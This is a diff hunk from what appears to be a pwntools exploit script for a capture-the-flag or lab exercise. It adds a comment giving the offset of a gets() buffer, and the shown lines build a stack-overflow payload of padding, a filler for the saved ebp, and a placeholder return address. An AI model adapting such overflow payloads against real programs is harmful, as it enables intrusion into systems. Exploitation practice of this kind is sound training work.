@@ -15,7 +15,7 @@ from pwn import *
 
 debug = False
 
-payload =  b""
+payload =  b""       # gets() buffer (ebp+0x2c)
 payload += b"A" * 44 #
 payload += b"B" * 4  # Old ebp
 payload += b"C" * 4  # Return address
